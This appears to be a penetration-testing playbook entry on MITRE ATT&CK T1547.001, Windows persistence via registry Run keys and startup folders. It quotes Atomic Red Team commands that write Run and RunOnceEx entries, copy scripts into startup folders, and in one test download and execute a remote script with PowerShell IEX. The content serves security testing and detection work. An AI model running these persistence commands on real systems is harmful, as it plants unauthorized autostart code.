---
name: "T1547.001_registry-run-keys-startup-folder"
description: "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1547.001
  - persistence
  - privilege-escalation
  - windows
  - sub-technique
technique_id: "T1547.001"
tactic: "persistence"
all_tactics:
  - persistence
  - privilege-escalation
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1547/001"
tech_stack:
  - windows
cwe_ids:
  - CWE-276
chains_with:
  - T1547
  - T1547.002
  - T1547.003
  - T1547.004
  - T1547.005
  - T1547.006
  - T1547.007
  - T1547.008
  - T1547.009
  - T1547.010
  - T1547.012
  - T1547.013
  - T1547.014
  - T1547.015
prerequisites:
  - T1547
severity_boost:
  T1547: "Chain with T1547 for deeper attack path"
  T1547.002: "Chain with T1547.002 for deeper attack path"
  T1547.003: "Chain with T1547.003 for deeper attack path"
---

# T1547.001 Registry Run Keys / Startup Folder

> **Sub-technique of:** T1547

## High-Level Description

Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.

The following run keys are created by default on Windows systems:

- <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
- <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
- <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
- <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

Run keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code>

Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

The following Registry keys can be used to set startup folder items for persistence:

- <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
- <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
- <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
- <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:

- <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
- <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
- <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
- <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

- <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
- <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user.

By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk \*</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.

## Kill Chain Phase

- Persistence (TA0003)
- Privilege Escalation (TA0004)

**Platforms:** Windows

## What to Check

- [ ] Identify if Registry Run Keys / Startup Folder technique is applicable to target environment
- [ ] Check Windows systems for indicators of Registry Run Keys / Startup Folder
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Reg Key Run

Run Key Persistence

Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout.

**Supported Platforms:** windows

```cmd
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
```

### Atomic Test 2: Reg Key RunOnce

RunOnce Key Persistence.

Upon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
```

### Atomic Test 3: PowerShell Registry RunOnce

RunOnce Key Persistence via PowerShell
Upon successful execution, a new entry will be added to the runonce item in the registry.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$RunOnceKey = "#{reg_key_path}"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
```

### Atomic Test 4: Suspicious vbs file run from startup Folder

vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, "T1547.001 Hello, World VBS!" will be displayed twice.
Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
folder and will also run when the computer is restarted and the user logs in.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
```

### Atomic Test 5: Suspicious jse file run from startup Folder

jse files can be placed in and ran from the startup folder to maintain persistance.
Upon execution, "T1547.001 Hello, World JSE!" will be displayed twice.
Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
folder and will also run when the computer is restarted and the user logs in.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Registry Run Keys / Startup Folder by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1547.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Detect Registry and Startup Folder Persistence (Windows)

## Risk Assessment

| Finding                                                 | Severity | Impact      |
| ------------------------------------------------------- | -------- | ----------- |
| Registry Run Keys / Startup Folder technique applicable | Low      | Persistence |

## CWE Categories

| CWE ID  | Title                         |
| ------- | ----------------------------- |
| CWE-276 | Incorrect Default Permissions |

## References

- [Malwarebytes Wow6432Node 2016](https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/)
- [Microsoft Wow6432Node 2018](https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry)
- [Microsoft Run Key](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
- [Oddvar Moe RunOnceEx Mar 2018](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)
- [TechNet Autoruns](https://technet.microsoft.com/en-us/sysinternals/bb963902)
- [Atomic Red Team - T1547.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1547.001)
- [MITRE ATT&CK - T1547.001](https://attack.mitre.org/techniques/T1547/001)
